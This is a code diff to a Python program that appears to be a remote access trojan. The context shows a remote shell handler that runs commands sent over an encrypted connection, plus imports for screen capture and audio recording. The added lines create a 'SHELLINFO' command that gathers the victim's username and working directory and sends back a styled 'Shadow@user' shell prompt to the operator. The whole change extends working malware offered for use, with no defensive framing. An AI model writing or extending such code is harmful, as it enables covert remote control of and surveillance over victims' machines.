@@ -14,6 +14,7 @@ import wavio
 import io
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
+from colorama import Fore, Style
 
 KEY = 'RANDOM_KEY'
 fernet = Fernet(KEY)
@@ -73,6 +74,8 @@ def handle_shell(conn):
             data = recv_command(conn)
             if data == "exit":
                 break
+            elif data == "SHELLINFO":
+                sendInput(conn)
             elif data.startswith("cd "):
                 os.chdir(data[3:])
                 send_data(conn, os.getcwd().encode())
@@ -137,6 +140,19 @@ def run(filename):
             os.system(f"start {program_path}")
         except:
             pass
+def sendInput(conn):
+    user = os.getlogin()
+    cwd = os.getcwd()
+    
+    home = os.path.expanduser("~")
+    display_path = cwd.replace(home, "~")
+
+    prefix = f"{Fore.CYAN}{Style.BRIGHT}┌──({Fore.MAGENTA}Shadow{Fore.CYAN}@{Fore.WHITE}{user}{Fore.CYAN})"
+    path_info = f"{Fore.CYAN}[{Fore.GREEN}{display_path}{Fore.CYAN}]"
+    suffix = f"{Fore.CYAN}└─{Fore.RED}$ {Style.RESET_ALL}"
+
+    value = f"{prefix}-{path_info}\n{suffix}"
+    send_data(conn, value.encode())
 def main():
     while True:
         try:
